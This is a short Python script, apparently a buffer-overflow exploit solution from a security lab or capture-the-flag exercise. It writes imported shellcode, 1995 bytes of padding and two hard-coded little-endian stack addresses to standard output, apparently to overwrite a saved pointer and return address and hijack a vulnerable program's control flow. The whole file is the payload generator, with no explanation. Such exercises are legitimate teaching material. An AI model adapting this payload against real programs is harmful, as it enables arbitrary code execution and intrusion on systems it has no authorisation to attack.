from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"\x60"*1995)
sys.stdout.buffer.write(0xfff6a538.to_bytes(4,"little"))
sys.stdout.buffer.write(0xfff6ad4c.to_bytes(4,"little"))
